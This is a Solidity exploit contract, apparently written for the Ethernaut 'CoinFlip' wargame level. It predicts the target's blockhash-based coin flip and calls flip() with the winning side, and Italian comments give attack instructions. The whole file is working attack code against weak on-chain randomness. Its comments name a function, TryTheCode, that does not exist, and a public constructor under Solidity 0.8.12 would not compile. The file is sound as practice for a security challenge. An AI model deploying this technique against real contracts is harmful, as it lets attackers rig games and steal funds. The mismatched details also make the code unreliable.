pragma solidity 0.8.12;

import './CoinFlip.sol';
import "openzeppelin-contracts/math/SafeMath.sol";

//ISTRUZIONI ATTACCO: Chiama TryTheCode(dovrebbe essere giusta) 
//Guarda cosa finisce dentro 'side', quello è l'argomento per la contract.methods.flip()

contract Attacker{
    using SafeMath for uint256;
    bool public side;
    bool public result;
    uint256 public blockValue;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public coinFlip;
    CoinFlip public coinflip;

    constructor() public {
        coinflip = CoinFlip(0x3846F459Cfb461F3bbfFe09581F12054fd3d7409); //Ethernaut CoinFlip Instance Address
    }

    function GuessFlip() public returns( bool ) {
      blockValue = uint256(blockhash(block.number.sub(1)));
      coinFlip = uint256(uint256(blockValue)/FACTOR);
      side = coinFlip == 1? true : false;
      result = coinflip.flip(side);

      return true;
    } 
}